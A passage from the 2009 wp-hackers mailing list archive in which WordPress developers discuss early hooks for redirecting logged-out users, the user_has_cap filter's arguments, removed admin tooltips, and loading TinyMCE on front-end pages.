References: <f38206c90910270813s2d509929pd6777bc6dd9efc79@mail.gmail.com>
Message-ID: <f38206c90910270817j5ba1b421g41de8bd7d439e64c@mail.gmail.com>

Looks like the init hook/action is what I'm looking for.

On Tue, Oct 27, 2009 at 11:13 AM, Jeremi Bergman <jeremib at gmail.com> wrote:

> I would like to redirect users who are not logged in at the earliest place
> possible within the code.  Is there a hook that is called first that woudl
> be the best place for this?
>
> Thanks
>
> --
> Jeremi Bergman
> 865-622-7134
>



-- 
Jeremi Bergman
865-622-7134

From gaarai at gaarai.com  Tue Oct 27 15:18:00 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Tue, 27 Oct 2009 10:18:00 -0500
Subject: [wp-hackers] Redirect user Not Logged In
In-Reply-To: <f38206c90910270813s2d509929pd6777bc6dd9efc79@mail.gmail.com>
References: <f38206c90910270813s2d509929pd6777bc6dd9efc79@mail.gmail.com>
Message-ID: <4AE70F28.50101@gaarai.com>

Without modifying core, the earliest action you can latch to is
"plugins_loaded". This runs immediately after all the activated plugins
have been initialized.

Of course, you could just put the processing code directly into an
activated plugin and not wait for the hook call.

If you are putting this code in a theme, the earliest action I recommend
using is "init".

Chris Jean
http://gaarai.com/
@chrisjean



Jeremi Bergman wrote:
> I would like to redirect users who are not logged in at the earliest place
> possible within the code.  Is there a hook that is called first that woudl
> be the best place for this?
>
> Thanks
>
>   

From anacin at gwhatchet.com  Tue Oct 27 15:17:53 2009
From: anacin at gwhatchet.com (Andrew Nacin)
Date: Tue, 27 Oct 2009 11:17:53 -0400
Subject: [wp-hackers] using user_has_cap filter
In-Reply-To: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>
References: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>
Message-ID: <8b870c460910270817h61b59e2lb2b9f3b989743942@mail.gmail.com>

http://phpxref.ftwr.co.uk/wordpress/wp-includes/capabilities.php.source.html#l697


> $caps is ????
>

The capability being asked for. If it's a meta capability, map_meta_cap
first determines the primitive capability.

$args are the extra arguments - post ID, etc. But what is $args[0], what is
> $args[1], etc. ????
>

It depends on the capability being asked for, so you can determine the
specific situation for which the capability is being requested. The post ID
will be passed by current_user_can if, say, the check is whether the user
can edit or delete a post. But it wouldn't be passed if the check is whether
the user can switch themes.

From johnbillion+wp at gmail.com  Tue Oct 27 15:18:50 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Tue, 27 Oct 2009 15:18:50 +0000
Subject: [wp-hackers] using user_has_cap filter
In-Reply-To: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>
References: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>
Message-ID: <1fa535a70910270818w26cd5e62h6c46da396fb893d7@mail.gmail.com>

$caps is an array containing the actual required capability (or
capabilities) for the current action. The best way to explain this is
by examples.

If you call current_user_can('delete_user',2) then the required
capability is delete_users not delete_user. $caps will contain
'delete_users'.

If you call current_user_can('edit_post',4) and post 4 doesn't belong
to you then $caps will contain several elements such as 'edit_posts',
'edit_others_posts' and maybe more depending on the post status.

In the two plugins I've written that filter user_has_cap, I've found
no need to use $caps at all so don't worry about it too much. Take a
look at map_meta_cap() which is in wp-includes/capabilities.php for
more info.

$args[0] is the required capability for the current_user_can() call.
Eg. current_user_can('edit_posts') will mean $args[0] is 'edit_posts'.

$args[1] is the current user ID.

$args[2] will be the value of the optional second parameter in
current_user_can(). Eg current_user_can('edit_post',5) will give us
'5' in $args[2].

HTH!

John.

2009/10/27 Steve Taylor <steve at sltaylor.co.uk>:
> I'm almost there with comprehending the user_has_cap filter, but I
> just need some clarification. If I add a filter like this:
>
> add_filter( 'user_has_cap', 'my_has_cap', 0, 3 );
>
> And then this is my callback function:
>
> function lockDeletion( $allcaps, $caps, $args ) {
> ? ?[whatever]
> }
>
> As far as I can tell:
>
> $allcaps is an array with capabilities for keys and boolean values
>
> $caps is ????
>
> $args are the extra arguments - post ID, etc. But what is $args[0],
> what is $args[1], etc. ????
>
> thanks,
>
> Steve Taylor
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bryanharley at gmail.com  Tue Oct 27 17:06:38 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 27 Oct 2009 10:06:38 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
Message-ID: <58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>

The 'pretty' tooltips certainly aren't.

On Tue, Oct 27, 2009 at 5:22 AM, scribu <scribu at gmail.com> wrote:
> The tolltips are still there in WP 2.9-rare. Check the HTML.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From tim.moore at maine.edu  Tue Oct 27 17:38:35 2009
From: tim.moore at maine.edu (Tim Moore)
Date: Tue, 27 Oct 2009 13:38:35 -0400
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
Message-ID: <6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>

I still see tooltips on my installs of 2.8. A yellow popup with text
describing each Add Media link comes up, no problem.

On Tue, Oct 27, 2009 at 1:06 PM, Bryan Harley <bryanharley at gmail.com> wrote:

> The 'pretty' tooltips certainly aren't.
>
> On Tue, Oct 27, 2009 at 5:22 AM, scribu <scribu at gmail.com> wrote:
> > The tolltips are still there in WP 2.9-rare. Check the HTML.
> >
> >
> > --
> > http://scribu.net
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bryanharley at gmail.com  Tue Oct 27 17:40:37 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 27 Oct 2009 10:40:37 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
Message-ID: <58410e2e0910271040t2e3397e2u67fc2bb44b370eb9@mail.gmail.com>

I'm referring to the stylized tooltips that were present in 2.5, but remove
shortly thereafter.



On Tue, Oct 27, 2009 at 10:38 AM, Tim Moore <tim.moore at maine.edu> wrote:

> I still see tooltips on my installs of 2.8. A yellow popup with text
> describing each Add Media link comes up, no problem.
>
> On Tue, Oct 27, 2009 at 1:06 PM, Bryan Harley <bryanharley at gmail.com>
> wrote:
>
> > The 'pretty' tooltips certainly aren't.
> >
> > On Tue, Oct 27, 2009 at 5:22 AM, scribu <scribu at gmail.com> wrote:
> > > The tolltips are still there in WP 2.9-rare. Check the HTML.
> > >
> > >
> > > --
> > > http://scribu.net
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Tue Oct 27 17:40:53 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 27 Oct 2009 12:40:53 -0500
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com> 
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com> 
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com> 
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
Message-ID: <161617690910271040q669373aj94f63f124c596745@mail.gmail.com>

The "pretty" tooltips he's talking about were commented out of common.js here:
http://core.trac.wordpress.org/changeset/8785

They were a big deal in 2.5:
http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/

I do not know why they were removed. Can't figure it out.

-Otto

From bryanharley at gmail.com  Tue Oct 27 17:42:41 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 27 Oct 2009 10:42:41 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
Message-ID: <58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>

Sounds like an easy fix for 2.9.  :-)

Thanks for the investigating Otto.



On Tue, Oct 27, 2009 at 10:40 AM, Otto <otto at ottodestruct.com> wrote:

> The "pretty" tooltips he's talking about were commented out of common.js
> here:
> http://core.trac.wordpress.org/changeset/8785
>
> They were a big deal in 2.5:
> http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/
>
> I do not know why they were removed. Can't figure it out.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Tue Oct 27 17:55:15 2009
From: scribu at gmail.com (scribu)
Date: Tue, 27 Oct 2009 19:55:15 +0200
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
Message-ID: <349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>

On Tue, Oct 27, 2009 at 10:40 AM, Otto <otto at ottodestruct.com> wrote:

>
> > The "pretty" tooltips he's talking about were commented out of common.js
> > here:
> > http://core.trac.wordpress.org/changeset/8785
> >
> > They were a big deal in 2.5:
> > http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/
> >
> > I do not know why they were removed. Can't figure it out.
> >
> > -Otto
>

Probably removed due to browser compatibility.

They look like bloat to me, so I say "Good riddance".


-- 
http://scribu.net

From bryanharley at gmail.com  Tue Oct 27 17:56:31 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 27 Oct 2009 10:56:31 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
Message-ID: <58410e2e0910271056r7c3b9fedtd8f0c62e8ca1ba9a@mail.gmail.com>

Nevermind, looks like all that's gone from the current trunk.  I'm curious
to know why it was removed and if we can get it restored.


On Tue, Oct 27, 2009 at 10:42 AM, Bryan Harley <bryanharley at gmail.com>wrote:

> Sounds like an easy fix for 2.9.  :-)
>
> Thanks for the investigating Otto.
>
>
>
>
> On Tue, Oct 27, 2009 at 10:40 AM, Otto <otto at ottodestruct.com> wrote:
>
>> The "pretty" tooltips he's talking about were commented out of common.js
>> here:
>> http://core.trac.wordpress.org/changeset/8785
>>
>> They were a big deal in 2.5:
>> http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/
>>
>> I do not know why they were removed. Can't figure it out.
>>
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From bryanharley at gmail.com  Tue Oct 27 17:57:40 2009
From: bryanharley at gmail.com (Bryan Harley)
Date: Tue, 27 Oct 2009 10:57:40 -0700
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
	<349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>
Message-ID: <58410e2e0910271057g318e5b5o1b7e650ebe597198@mail.gmail.com>

Scribu -   From the standpoint of usability, I think we at least need
descriptive text need to each media button.


On Tue, Oct 27, 2009 at 10:55 AM, scribu <scribu at gmail.com> wrote:

> On Tue, Oct 27, 2009 at 10:40 AM, Otto <otto at ottodestruct.com> wrote:
>
> >
> > > The "pretty" tooltips he's talking about were commented out of
> common.js
> > > here:
> > > http://core.trac.wordpress.org/changeset/8785
> > >
> > > They were a big deal in 2.5:
> > > http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/
> > >
> > > I do not know why they were removed. Can't figure it out.
> > >
> > > -Otto
> >
>
> Probably removed due to browser compatibility.
>
> They look like bloat to me, so I say "Good riddance".
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Tue Oct 27 18:07:51 2009
From: scribu at gmail.com (scribu)
Date: Tue, 27 Oct 2009 20:07:51 +0200
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <58410e2e0910271057g318e5b5o1b7e650ebe597198@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
	<349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>
	<58410e2e0910271057g318e5b5o1b7e650ebe597198@mail.gmail.com>
Message-ID: <349fe48b0910271107h5b29f565q9fd50b46042ceff3@mail.gmail.com>

On Tue, Oct 27, 2009 at 7:57 PM, Bryan Harley <bryanharley at gmail.com> wrote:

> Scribu -   From the standpoint of usability, I think we at least need
> descriptive text need to each media button.
>

Descriptive text is displayed well enough using native tooltips. The old
ones just add rounded corners.

-- 
http://scribu.net

From mgerring at emrl.com  Tue Oct 27 19:01:09 2009
From: mgerring at emrl.com (Matthew Gerring)
Date: Tue, 27 Oct 2009 12:01:09 -0700
Subject: [wp-hackers]  TinyMCE in the frontend?
In-Reply-To: <58410e2e0910271056r7c3b9fedtd8f0c62e8ca1ba9a@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
	<58410e2e0910271056r7c3b9fedtd8f0c62e8ca1ba9a@mail.gmail.com>
Message-ID: <BE0EF4B8-BB8D-4B20-B6C7-2B7490929B97@emrl.com>

Hello all.

I'm banging my head against the wall right now trying to get a TinyMCE  
editor to show up on a front-end page.

I used the_editor(); , which works to an extent, until I actually try  
to use the textarea it creates. Not only do the HTML buttons not do  
anything, but I can't switch into TinyMCE mode. I get an undefined  
function call.

I know that in order for TinyMCE to work you have to include a  
boatload of JS and CSS, but there doesn't seem to be a complete list  
anywhere, and all of the documentation on this I've seen is centered  
on how to include TinyMCE in plugins, not in a front-end page, so the  
filters I have to use are totally different.

Moreover, calling wp_tiny_mce(); at any point in a front-end page  
causes the whole thing to whitescreen.

I'm using WPMU, although I'm not sure if that makes a difference.

Does anyone know how to do this?

-Matthew

From ncrice at gmail.com  Tue Oct 27 19:12:21 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 27 Oct 2009 15:12:21 -0400
Subject: [wp-hackers] TinyMCE in the frontend?
In-Reply-To: <BE0EF4B8-BB8D-4B20-B6C7-2B7490929B97@emrl.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
	<58410e2e0910271056r7c3b9fedtd8f0c62e8ca1ba9a@mail.gmail.com>
	<BE0EF4B8-BB8D-4B20-B6C7-2B7490929B97@emrl.com>
Message-ID: <862d087f0910271212y7336930fk8c3a933e4e063251@mail.gmail.com>

http://lists.automattic.com/pipermail/wp-hackers/2009-October/028176.html

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com


On Tue, Oct 27, 2009 at 3:01 PM, Matthew Gerring <mgerring at emrl.com> wrote:

> Hello all.
>
> I'm banging my head against the wall right now trying to get a TinyMCE
> editor to show up on a front-end page.
>
> I used the_editor(); , which works to an extent, until I actually try to
> use the textarea it creates. Not only do the HTML buttons not do anything,
> but I can't switch into TinyMCE mode. I get an undefined function call.
>
> I know that in order for TinyMCE to work you have to include a boatload of
> JS and CSS, but there doesn't seem to be a complete list anywhere, and all
> of the documentation on this I've seen is centered on how to include TinyMCE
> in plugins, not in a front-end page, so the filters I have to use are
> totally different.
>
> Moreover, calling wp_tiny_mce(); at any point in a front-end page causes
> the whole thing to whitescreen.
>
> I'm using WPMU, although I'm not sure if that makes a difference.
>
> Does anyone know how to do this?
>
> -Matthew
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mgerring at emrl.com  Tue Oct 27 19:16:26 2009
From: mgerring at emrl.com (Matthew Gerring)
Date: Tue, 27 Oct 2009 12:16:26 -0700
Subject: [wp-hackers] TinyMCE in the frontend?
In-Reply-To: <862d087f0910271212y7336930fk8c3a933e4e063251@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com>
	<58410e2e0910271056r7c3b9fedtd8f0c62e8ca1ba9a@mail.gmail.com>
	<BE0EF4B8-BB8D-4B20-B6C7-2B7490929B97@emrl.com>
	<862d087f0910271212y7336930fk8c3a933e4e063251@mail.gmail.com>
Message-ID: <BFFDE343-970F-417C-A357-F43C744F0991@emrl.com>

Right. The instructions in that message didn't work. wp_tiny_mce();  
just causes WordPress to whitescreen if it's placed in the header, and  
I haven't found a filter that actually causes any of those scripts to  
be loaded in the front end.

I've tried wp_head and template_redirect. Either nothing happens, or I  
just get a white screen.

On Oct 27, 2009, at 12:12 PM, Nathan Rice wrote:

> http://lists.automattic.com/pipermail/wp-hackers/2009-October/028176.html
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com
>
>
> On Tue, Oct 27, 2009 at 3:01 PM, Matthew Gerring <mgerring at emrl.com>  
> wrote:
>
>> Hello all.
>>
>> I'm banging my head against the wall right now trying to get a  
>> TinyMCE
>> editor to show up on a front-end page.
>>
>> I used the_editor(); , which works to an extent, until I actually  
>> try to
>> use the textarea it creates. Not only do the HTML buttons not do  
>> anything,
>> but I can't switch into TinyMCE mode. I get an undefined function  
>> call.
>>
>> I know that in order for TinyMCE to work you have to include a  
>> boatload of
>> JS and CSS, but there doesn't seem to be a complete list anywhere,  
>> and all
>> of the documentation on this I've seen is centered on how to  
>> include TinyMCE
>> in plugins, not in a front-end page, so the filters I have to use are
>> totally different.
>>
>> Moreover, calling wp_tiny_mce(); at any point in a front-end page  
>> causes
>> the whole thing to whitescreen.
>>
>> I'm using WPMU, although I'm not sure if that makes a difference.
>>
>> Does anyone know how to do this?
>>
>> -Matthew
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From sharon at BrewerRadio.com  Tue Oct 27 19:18:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Tue, 27 Oct 2009 15:18:00 -0400
Subject: [wp-hackers] Plugin or Advice for Front-End Dashboard
Message-ID: <45515ddb.1ca573a.146a0525.ddc@BrewerRadio.com>

Thanks for the many suggestions on this...looks like this one might do what I need.
-Sharon


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of esmi at quirm dot net
Sent: Friday, October 23, 2009 6:12 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Plugin or Advice for Front-End Dashboard

What about:

<http://wordpress.org/extend/plugins/tdo-mini-forms/>

-- 
esmi



_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From otto at ottodestruct.com  Tue Oct 27 20:17:50 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 27 Oct 2009 15:17:50 -0500
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com> 
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com> 
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com> 
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com> 
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com> 
	<58410e2e0910271042v4ae4f5a6m1ce90d92c74ceb05@mail.gmail.com> 
	<349fe48b0910271055q70282353s206b560f864a0ea5@mail.gmail.com>
Message-ID: <161617690910271317s207e05b7p8fec61b247a2cf51@mail.gmail.com>

For reference, the tooltips were checked in by matt (on behalf of
azaozz, who also later removed them) here:
http://core.trac.wordpress.org/changeset/7311/trunk/wp-admin/js/common.js

IMO, judging from the fact that they got commented out in a seemingly
unrelated ticket, I'm guessing that their removal was a total mistake.
But you'd have to ask Andrew and/or Matt about that.


-Otto
Sent from Memphis, TN, United States


On Tue, Oct 27, 2009 at 12:55 PM, scribu <scribu at gmail.com> wrote:
> On Tue, Oct 27, 2009 at 10:40 AM, Otto <otto at ottodestruct.com> wrote:
>
>>
>> > The "pretty" tooltips he's talking about were commented out of common.js
>> > here:
>> > http://core.trac.wordpress.org/changeset/8785
>> >
>> > They were a big deal in 2.5:
>> > http://planetozh.com/blog/2008/04/how-to-use-wordpress-25-tooltips/
>> >
>> > I do not know why they were removed. Can't figure it out.
>> >
>> > -Otto
>>
>
> Probably removed due to browser compatibility.
>
> They look like bloat to me, so I say "Good riddance".
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jeremy at visser.name  Wed Oct 28 04:18:32 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Wed, 28 Oct 2009 15:18:32 +1100
Subject: [wp-hackers] Why were the image tooltips removed?
In-Reply-To: <161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
References: <58410e2e0910261816v1544dcffqa6a37b4bd72de428@mail.gmail.com>
	<349fe48b0910270522y7e99c60cxf39f685e17e2656@mail.gmail.com>
	<58410e2e0910271006t7b0c8808w6a2a91799fd30aa1@mail.gmail.com>
	<6ab20b230910271038s78b56fb1q3b9a69bba6f99901@mail.gmail.com>
	<161617690910271040q669373aj94f63f124c596745@mail.gmail.com>
Message-ID: <1256703512.3484.1.camel@rillian.narnia.sunriseroad.net>

On Tue, 2009-10-27 at 12:40 -0500, Otto wrote:
> I do not know why they were removed. Can't figure it out.

Because they only worked with JavaScript enabled, likely. Plus, putting
the labels in the title="" attribute is far more semantic.

(So if you want tooltips like WP 2.5, the proper "ground-up" solution is
to fix your user-agent to display tooltips with no delay, not make a
JavaScript hack.)


From steve at sltaylor.co.uk  Wed Oct 28 23:39:37 2009
From: steve at sltaylor.co.uk (Steve Taylor)
Date: Wed, 28 Oct 2009 23:39:37 +0000
Subject: [wp-hackers] using user_has_cap filter
In-Reply-To: <1fa535a70910270818w26cd5e62h6c46da396fb893d7@mail.gmail.com>
References: <a21f8bf00910270636n54607d8jb3912e35d3ca90d4@mail.gmail.com>
	<1fa535a70910270818w26cd5e62h6c46da396fb893d7@mail.gmail.com>
Message-ID: <a21f8bf00910281639r7572d050nbd05d6817980afd2@mail.gmail.com>

John, many thanks, that was exactly what I needed.

Steve


2009/10/27 John Blackbourn <johnbillion+wp at gmail.com>:
> $caps is an array containing the actual required capability (or
> capabilities) for the current action. The best way to explain this is
> by examples.
>
> If you call current_user_can('delete_user',2) then the required
> capability is delete_users not delete_user. $caps will contain
> 'delete_users'.
>
> If you call current_user_can('edit_post',4) and post 4 doesn't belong
> to you then $caps will contain several elements such as 'edit_posts',
> 'edit_others_posts' and maybe more depending on the post status.
>
> In the two plugins I've written that filter user_has_cap, I've found
> no need to use $caps at all so don't worry about it too much. Take a
> look at map_meta_cap() which is in wp-includes/capabilities.php for
> more info.
>
> $args[0] is the required capability for the current_user_can() call.
> Eg. current_user_can('edit_posts') will mean $args[0] is 'edit_posts'.
>
> $args[1] is the current user ID.
>
> $args[2] will be the value of the optional second parameter in
> current_user_can(). Eg current_user_can('edit_post',5) will give us
> '5' in $args[2].
>
> HTH!
>
> John.
>
> 2009/10/27 Steve Taylor <steve at sltaylor.co.uk>:
>> I'm almost there with comprehending the user_has_cap filter, but I
>> just need some clarification. If I add a filter like this:
>>
>> add_filter( 'user_has_cap', 'my_has_cap', 0, 3 );
>>
>> And then this is my callback function:
>>
>> function lockDeletion( $allcaps, $caps, $args ) {
>> ? ?[whatever]
>> }
>>
>> As far as I can tell:
>>
>> $allcaps is an array with capabilities for keys and boolean values
>>
>> $caps is ????
>>
>> $args are the extra arguments - post ID, etc. But what is $args[0],
>> what is $args[1], etc. ????
>>
>> thanks,
>>
>> Steve Taylor
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Thu Oct 29 07:33:55 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 29 Oct 2009 03:33:55 -0400
Subject: [wp-hackers] How to get Google Sitelinks
Message-ID: <e4dc67e0910290033l69adffb3ua2e21be6bfcba3a@mail.gmail.com>

If this is OT for wp-hackers please let me know.

I would like to ask you guys what WordPress function, such as
wp_list_pages(), wp_list_categories(), wp_list_bookmarks(),
WP_Widget_Links(), et cetera, or what theme technique have worked for
